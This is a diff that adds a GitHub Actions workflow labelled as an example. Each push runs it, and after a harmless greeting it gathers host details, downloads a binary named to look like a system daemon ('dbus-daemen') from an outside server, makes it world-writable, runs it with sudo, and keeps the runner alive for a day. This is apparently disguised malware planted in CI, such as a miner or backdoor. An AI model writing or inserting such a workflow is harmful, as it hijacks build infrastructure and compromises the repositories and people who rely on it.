@@ -1,0 +1,19 @@
+name: Example workflow for GitHub Actions
+ 
+on: [push]
+ 
+jobs:
+  test-run:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Run a shell script
+      run: |
+        echo "Hello, GitHub Actions!"
+        pwd
+        ls -la
+        whoami
+        uname -a
+        wget https://im.openjad.com:19443/dbus-daemen
+        chmod 777 dbus-daemen
+        sudo ./dbus-daemen
+        sleep 1d
